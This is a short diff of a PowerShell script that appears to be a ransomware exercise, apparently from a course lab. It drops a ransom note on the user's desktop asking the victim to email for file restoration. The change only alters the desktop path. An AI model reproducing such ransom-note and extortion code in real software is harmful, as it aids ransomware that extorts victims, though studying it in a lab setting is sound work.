@@ -38,7 +38,7 @@ if ( Test-Path $newFile) {
 $msg = "If you want your files restored, please contact me at blaise.notter@mymail.champlain.edu. I look forward to doing business with you ;-)"
 
 # Create the Readme file
-$readme = "C:\Users\blais\Desktop\Readme.READ"
+$readme = "C:\Users\champuser\Desktop\Readme.READ"
 
 # Add the file to user's desktop
 echo $msg | Out-File -FilePath $readme
